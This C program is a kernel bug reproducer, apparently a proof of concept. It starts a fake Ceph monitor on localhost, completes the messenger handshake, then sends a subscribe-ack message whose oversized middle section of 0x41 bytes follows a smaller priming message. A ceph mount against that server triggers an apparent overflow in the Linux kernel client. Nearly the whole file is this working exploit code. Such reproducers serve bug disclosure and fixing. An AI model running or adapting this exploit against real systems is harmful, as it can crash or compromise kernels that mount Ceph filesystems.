// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <signal.h>

#define MON_PORT 6789

#define CEPH_BANNER "ceph v027"
#define CEPH_BANNER_LEN 9
#define ENTITY_ADDR_LEN (4 + 4 + 128)

#define CEPH_MSGR_TAG_READY 1
#define CEPH_MSGR_TAG_MSG   7

#define CEPH_MSG_MON_SUBSCRIBE_ACK 16
#define CEPH_MSG_AUTH_REPLY        18

#define CEPH_ENTITY_TYPE_MON 0x01

#define PRIME_MIDDLE_LEN  16
#define OVERFLOW_MIDDLE_LEN 4096

static uint32_t crc32c_tab[256];

static void crc32c_init(void)
{
	uint32_t i, j, c;
	for (i = 0; i < 256; i++) {
		c = i;
		for (j = 0; j < 8; j++)
			c = (c & 1) ? (0x82F63B78u ^ (c >> 1)) : (c >> 1);
		crc32c_tab[i] = c;
	}
}

static uint32_t crc32c(uint32_t crc, const void *p, size_t len)
{
	const uint8_t *b = p;
	while (len--)
		crc = (crc >> 8) ^ crc32c_tab[(crc & 255) ^ *b++];
	return crc;
}

struct ceph_msg_connect {
	uint64_t features;
	uint32_t host_type;
	uint32_t global_seq;
	uint32_t connect_seq;
	uint32_t protocol_version;
	uint32_t authorizer_protocol;
	uint32_t authorizer_len;
	uint8_t  flags;
} __attribute__((packed));

struct ceph_msg_connect_reply {
	uint8_t  tag;
	uint64_t features;
	uint32_t global_seq;
	uint32_t connect_seq;
	uint32_t protocol_version;
	uint32_t authorizer_len;
	uint8_t  flags;
} __attribute__((packed));

struct ceph_msg_header {
	uint64_t seq;
	uint64_t tid;
	uint16_t type;
	uint16_t priority;
	uint16_t version;
	uint32_t front_len;
	uint32_t middle_len;
	uint32_t data_len;
	uint16_t data_off;
	struct {
		uint8_t  type;
		uint64_t num;
	} __attribute__((packed)) src;
	uint16_t compat_version;
	uint16_t reserved;
	uint32_t crc;
} __attribute__((packed));

struct ceph_msg_footer_old {
	uint32_t front_crc, middle_crc, data_crc;
	uint8_t  flags;
} __attribute__((packed));

struct ceph_msg_footer {
	uint32_t front_crc, middle_crc, data_crc;
	uint64_t sig;
	uint8_t  flags;
} __attribute__((packed));

#define SERVER_FEATURES (1ULL << 23)

static int write_all(int fd, const void *buf, size_t len)
{
	const uint8_t *p = buf;
	while (len) {
		ssize_t n = write(fd, p, len);
		if (n <= 0) {
			if (n < 0 && errno == EINTR)
				continue;
			return -1;
		}
		p += n;
		len -= n;
	}
	return 0;
}

static int read_all(int fd, void *buf, size_t len)
{
	uint8_t *p = buf;
	while (len) {
		ssize_t n = read(fd, p, len);
		if (n <= 0) {
			if (n < 0 && errno == EINTR)
				continue;
			return -1;
		}
		p += n;
		len -= n;
	}
	return 0;
}

static int send_msg(int c, uint64_t seq, uint16_t type,
		    const void *front, uint32_t front_len,
		    const void *middle, uint32_t middle_len)
{
	uint8_t tag = CEPH_MSGR_TAG_MSG;
	struct ceph_msg_header h;
	struct ceph_msg_footer f;

	memset(&h, 0, sizeof(h));
	h.seq = seq;
	h.tid = 0;
	h.type = type;
	h.priority = 127;
	h.version = 1;
	h.front_len = front_len;
	h.middle_len = middle_len;
	h.data_len = 0;
	h.data_off = 0;
	h.src.type = CEPH_ENTITY_TYPE_MON;
	h.src.num = 0;
	h.compat_version = 1;
	h.reserved = 0;
	h.crc = crc32c(0, &h, offsetof(struct ceph_msg_header, crc));

	memset(&f, 0, sizeof(f));
	f.front_crc = crc32c(0, front, front_len);
	f.middle_crc = middle_len ? crc32c(0, middle, middle_len) : 0;
	f.data_crc = 0;
	f.sig = 0;
	f.flags = 1;

	if (write_all(c, &tag, 1))
		return -1;
	if (write_all(c, &h, sizeof(h)))
		return -1;
	if (front_len && write_all(c, front, front_len))
		return -1;
	if (middle_len && write_all(c, middle, middle_len))
		return -1;
	if (write_all(c, &f, sizeof(f)))
		return -1;
	return 0;
}

static void *mon_server(void *arg)
{
	int s, c, one = 1;
	struct sockaddr_in sa;
	uint8_t banner[CEPH_BANNER_LEN + 2 * ENTITY_ADDR_LEN];
	uint8_t *srv_addr, *cli_addr;
	uint8_t junk[4096];
	struct ceph_msg_connect cm;
	struct ceph_msg_connect_reply cr;
	uint8_t front[20];
	uint8_t *middle;
	int served = 0;

	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0) {
		perror("socket");
		return NULL;
	}
	setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(MON_PORT);
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("bind");
		return NULL;
	}
	listen(s, 8);
	printf("[fake-mon] listening on 127.0.0.1:%d\n", MON_PORT);
	fflush(stdout);

	for (;;) {
		c = accept(s, NULL, NULL);
		if (served) {

			for (;;) {
				ssize_t n = read(c, junk, sizeof(junk));
				if (n <= 0)
					break;
			}
			close(c);
			continue;
		}
		if (c < 0) {
			perror("accept");
			return NULL;
		}
		setsockopt(c, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

		memset(banner, 0, sizeof(banner));
		memcpy(banner, CEPH_BANNER, CEPH_BANNER_LEN);
		srv_addr = banner + CEPH_BANNER_LEN;
		cli_addr = srv_addr + ENTITY_ADDR_LEN;

		cli_addr[8] = 0x00;
		cli_addr[9] = 0x02;
		cli_addr[10] = 0x30;
		cli_addr[11] = 0x39;
		cli_addr[12] = 127;
		cli_addr[13] = 0;
		cli_addr[14] = 0;
		cli_addr[15] = 1;
		if (write_all(c, banner, sizeof(banner)))
			goto next;

		if (read_all(c, junk, CEPH_BANNER_LEN + ENTITY_ADDR_LEN))
			goto next;

		if (read_all(c, &cm, sizeof(cm)))
			goto next;
		if (cm.authorizer_len) {
			if (cm.authorizer_len > sizeof(junk))
				goto next;
			if (read_all(c, junk, cm.authorizer_len))
				goto next;
		}

		memset(&cr, 0, sizeof(cr));
		cr.tag = CEPH_MSGR_TAG_READY;
		cr.features = SERVER_FEATURES;
		cr.global_seq = 1;
		cr.connect_seq = cm.connect_seq + 1;
		cr.protocol_version = cm.protocol_version;
		cr.authorizer_len = 0;
		cr.flags = 0;
		if (write_all(c, &cr, sizeof(cr)))
			goto next;

		middle = malloc(OVERFLOW_MIDDLE_LEN);
		memset(middle, 0x41, OVERFLOW_MIDDLE_LEN);
		memset(front, 0, sizeof(front));
		*(uint32_t *)front = 300;

		if (send_msg(c, 1, CEPH_MSG_MON_SUBSCRIBE_ACK,
			     front, sizeof(front), middle, PRIME_MIDDLE_LEN))
			goto next;
		usleep(300 * 1000);

		if (send_msg(c, 2, CEPH_MSG_MON_SUBSCRIBE_ACK,
			     front, sizeof(front), middle, OVERFLOW_MIDDLE_LEN))
			goto next;
		served = 1;

		for (;;) {
			ssize_t n = read(c, junk, sizeof(junk));
			if (n <= 0)
				break;
		}
next:
		close(c);
	}
	return NULL;
}

int main(void)
{
	pthread_t th;
	int ret;

	setvbuf(stdout, NULL, _IONBF, 0);
	signal(SIGPIPE, SIG_IGN);
	crc32c_init();

	pthread_create(&th, NULL, mon_server, NULL);
	usleep(200 * 1000);

	mkdir("/mnt", 0755);
	printf("[poc] mount(2) ceph ...\n");
	ret = mount("127.0.0.1:6789:/", "/mnt", "ceph", 0, "name=admin");
	printf("[poc] mount ret=%d errno=%d (%s)\n", ret, errno, strerror(errno));

	sleep(20);
	return 0;
}
